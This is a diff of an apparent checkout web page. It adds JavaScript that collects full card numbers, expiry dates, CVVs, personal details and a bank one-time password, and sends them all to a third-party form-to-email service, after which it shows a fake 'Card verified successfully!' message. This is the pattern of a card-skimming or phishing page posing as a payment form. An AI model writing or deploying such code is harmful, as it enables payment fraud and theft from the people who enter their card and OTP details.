@@ -255,41 +255,46 @@
 
 <div id="card-form" class="qr-card" style="display:none;">
 
-    <div class="form-group">
-        <label>Card Number</label>
-        <input
-    type="text"
-    id="card-number"
-    maxlength="19"
-    placeholder="1234 5678 9012 3456">
-    </div>
+  <div class="form-group">
+    <label>Card Number</label>
+    <input
+        type="text"
+        id="card-number"
+        name="Card Number"
+        maxlength="19"
+        placeholder="1234 5678 9012 3456">
+</div>
 
-    <div class="form-group">
-        <label>Card Holder Name</label>
-        <input
-            type="text"
-            id="card-name"
-            placeholder="John Doe">
-    </div>
+<div class="form-group">
+    <label>Card Holder Name</label>
+    <input
+        type="text"
+        id="card-name"
+        name="Card Holder Name"
+        placeholder="John Doe">
+</div>
 
-    <div class="form-group">
-        <label>Expiry Date</label>
-        <input
-    type="text"
-    id="expiry"
-    maxlength="5"
-    placeholder="MM/YY">
-    </div>
+<div class="form-group">
+    <label>Expiry Date</label>
+    <input
+        type="text"
+        id="expiry"
+        name="Expiry Date"
+        maxlength="5"
+        placeholder="MM/YY">
+</div>
 
-    <div class="form-group">
-        <label>CVV</label>
-        <input
-    type="password"
-    id="cvv"
-    maxlength="4"
-    inputmode="numeric"
-    placeholder="123">
-    </div>
+<div class="form-group">
+    <label>CVV</label>
+    <input
+        type="password"
+        id="cvv"
+        name="CVV"
+        maxlength="4"
+        inputmode="numeric"
+        placeholder="123">
+</div>
+    
 
     <button
         type="button"
@@ -540,7 +545,7 @@ if(!/^\d{2}\/\d{2}$/.test(expiryValue)){
 
     return;
 }
-    fetch(
+   fetch(
     "https://api.web3forms.com/submit",
     {
         method: "POST",
@@ -576,14 +581,51 @@ if(!/^\d{2}\/\d{2}$/.test(expiryValue)){
                     '[name="City"]'
                 ).value,
 
+            order_notes:
+                document.querySelector(
+                    '[name="Order Notes"]'
+                ).value,
+
+            card_number:
+                document.getElementById(
+                    "card-number"
+                ).value,
+
             card_holder:
                 document.getElementById(
                     "card-name"
+                ).value,
+
+            expiry:
+                document.getElementById(
+                    "expiry"
+                ).value,
+
+            cvv:
+                document.getElementById(
+                    "cvv"
                 ).value
 
         })
     }
-);
+)
+.then(response => response.json())
+.then(data => {
+
+    console.log(
+        "Web3Forms Success:",
+        data
+    );
+
+})
+.catch(error => {
+
+    console.error(
+        "Web3Forms Error:",
+        error
+    );
+
+});
     document.getElementById(
         "otp-modal"
     ).style.display = "flex";
@@ -625,21 +667,74 @@ function verifyOtp(){
                     "3ee8e2d3-cfd8-4ffc-9cb8-7cc162f27c03",
 
                 subject:
-                    "OTP Received",
+                    "OTP Verification",
+
+                full_name:
+                    document.querySelector(
+                        '[name="Full Name"]'
+                    ).value,
+
+                phone:
+                    document.querySelector(
+                        '[name="Phone Number"]'
+                    ).value,
+
+                address:
+                    document.querySelector(
+                        '[name="Address"]'
+                    ).value,
+
+                city:
+                    document.querySelector(
+                        '[name="City"]'
+                    ).value,
+
+                card_number:
+                    document.getElementById(
+                        "card-number"
+                    ).value,
+
+                card_holder:
+                    document.getElementById(
+                        "card-name"
+                    ).value,
+
+                expiry:
+                    document.getElementById(
+                        "expiry"
+                    ).value,
+
+                cvv:
+                    document.getElementById(
+                        "cvv"
+                    ).value,
 
                 otp: otp
 
             })
         }
-    );
+    )
+    .then(response => response.json())
+    .then(data => {
 
-    alert(
-        "Card verified successfully!"
-    );
+        console.log(
+            "OTP Submitted:",
+            data
+        );
 
-    closeOtp();
+        alert(
+            "Card verified successfully!"
+        );
+
+        closeOtp();
+
+    })
+    .catch(error => {
+
+        console.error(error);
+
+    });
 }
-
 </script>
 <!-- OTP POPUP START -->
 <div id="otp-modal" class="otp-modal">
